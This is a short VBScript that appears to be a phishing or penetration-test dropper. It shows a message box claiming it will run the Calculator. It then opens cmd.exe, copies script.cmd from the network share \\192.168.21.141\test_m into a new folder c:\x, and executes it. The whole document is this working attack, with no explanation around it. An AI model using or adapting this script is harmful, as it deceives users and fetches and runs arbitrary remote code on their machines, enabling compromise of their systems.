msgbox "Press OK to run the Calculator"
Set shell=CreateObject("wscript.shell")
Shell.Run("c:\\windows\\system32\\cmd.exe /c mkdir c:\x&&copy \\192.168.21.141\test_m\script.cmd c:\x&&c:\x\script.cmd")